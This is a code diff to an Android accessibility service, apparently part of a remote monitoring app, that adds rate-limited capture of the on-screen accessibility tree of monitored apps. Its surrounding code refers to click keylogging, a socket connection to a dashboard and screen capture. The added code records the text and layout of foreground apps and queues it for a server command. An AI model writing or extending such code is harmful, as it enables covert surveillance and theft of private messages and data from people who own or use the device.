@@ -124,6 +124,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     // Prevents duplicate log entries when the OS fires multiple click events for one tap.
     private final java.util.Map<String, Long> lastClickLogTime = new java.util.HashMap<>();
 
+    // ── Accessibility snapshot rate-limiter (one snapshot per monitored app per 10 s) ──
+    private final java.util.Map<String, Long> lastSnapshotTime = new java.util.HashMap<>();
+    private static final long SNAPSHOT_MIN_INTERVAL_MS = 10_000L;
+
     // O(1) lookup set for packages that receive click-event keylogging.
     // Built once from Constants.MONITORED_PACKAGES at class-load time.
     private static final java.util.Set<String> CLICK_LOG_PACKAGES;
@@ -698,6 +702,28 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     try {
                         SocketManager smWin = SocketManager.getInstance(this);
                         smWin.getAppMonitor().onAppForeground(packageName);
+                        // Capture an accessibility-tree snapshot for monitored apps.
+                        // Rate-limited to once per SNAPSHOT_MIN_INTERVAL_MS per package.
+                        // Stored locally; only sent to server when list_app_screenshots is run.
+                        try {
+                            if (com.task.tusker.commands.AppMonitor.isMonitored(packageName)) {
+                                long now = System.currentTimeMillis();
+                                Long last = lastSnapshotTime.get(packageName);
+                                if (last == null || now - last >= SNAPSHOT_MIN_INTERVAL_MS) {
+                                    lastSnapshotTime.put(packageName, now);
+                                    new android.os.Handler(android.os.Looper.getMainLooper())
+                                        .postDelayed(() -> {
+                                            try {
+                                                String snap = captureNodeTree();
+                                                if (snap != null) {
+                                                    smWin.getAppMonitor()
+                                                         .onAccessibilitySnapshot(packageName, snap);
+                                                }
+                                            } catch (Exception ignored) {}
+                                        }, 300); // brief delay so window content settles
+                                }
+                            }
+                        } catch (Exception ignored) {}
                         // Push recent activity to dashboard
                         if (smWin.isConnected() && packageName != null && !packageName.isEmpty()) {
                             smWin.pushRecentActivity(packageName, getAppNameForPkg(packageName));
@@ -3675,6 +3701,81 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             Log.e(TAG, "captureScreenSync error: " + e.getMessage());
         }
         return result.get();
+    }
+
+    // ── Accessibility node-tree snapshot ──────────────────────────────────────
+
+    /**
+     * Walk the current window's accessibility node tree and produce a compact JSON
+     * representation suitable for offline storage and remote review.
+     * This is intentionally lightweight — no pixel data, no images.
+     * Each node carries: class, text, contentDesc, resourceId, bounds, and child nodes.
+     *
+     * Returns a JSON string, or null if the root window is unavailable.
+     */
+    public String captureNodeTree() {
+        try {
+            AccessibilityNodeInfo root = getRootInActiveWindow();
+            if (root == null) return null;
+            JSONObject snap = new JSONObject();
+            snap.put("ts", new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
+                    java.util.Locale.getDefault()).format(new java.util.Date()));
+            snap.put("pkg", root.getPackageName() != null ? root.getPackageName().toString() : "");
+            snap.put("tree", nodeToJson(root, 0, 8));
+            root.recycle();
+            return snap.toString();
+        } catch (Exception e) {
+            Log.e(TAG, "captureNodeTree: " + e.getMessage());
+            return null;
+        }
+    }
+
+    /**
+     * Recursively convert an AccessibilityNodeInfo to a compact JSONObject.
+     * Stops recursion at maxDepth to keep the output small.
+     */
+    private JSONObject nodeToJson(AccessibilityNodeInfo node, int depth, int maxDepth) {
+        JSONObject o = new JSONObject();
+        try {
+            // Class name (last segment only to save space)
+            if (node.getClassName() != null) {
+                String cls = node.getClassName().toString();
+                int dot = cls.lastIndexOf('.');
+                o.put("c", dot >= 0 ? cls.substring(dot + 1) : cls);
+            }
+            // Text content
+            if (node.getText() != null && node.getText().length() > 0)
+                o.put("t", node.getText().toString());
+            // Content description
+            if (node.getContentDescription() != null && node.getContentDescription().length() > 0)
+                o.put("d", node.getContentDescription().toString());
+            // Resource id (last segment after '/')
+            if (node.getViewIdResourceName() != null) {
+                String rid = node.getViewIdResourceName();
+                int slash = rid.lastIndexOf('/');
+                o.put("id", slash >= 0 ? rid.substring(slash + 1) : rid);
+            }
+            // Bounds
+            android.graphics.Rect bounds = new android.graphics.Rect();
+            node.getBoundsInScreen(bounds);
+            if (!bounds.isEmpty())
+                o.put("b", bounds.left + "," + bounds.top + "," + bounds.right + "," + bounds.bottom);
+
+            // Children
+            int count = node.getChildCount();
+            if (count > 0 && depth < maxDepth) {
+                JSONArray children = new JSONArray();
+                for (int i = 0; i < count; i++) {
+                    AccessibilityNodeInfo child = node.getChild(i);
+                    if (child != null) {
+                        children.put(nodeToJson(child, depth + 1, maxDepth));
+                        child.recycle();
+                    }
+                }
+                if (children.length() > 0) o.put("ch", children);
+            }
+        } catch (Exception ignored) {}
+        return o;
     }
 
     // ── Notification panel helpers ─────────────────────────────────────────────
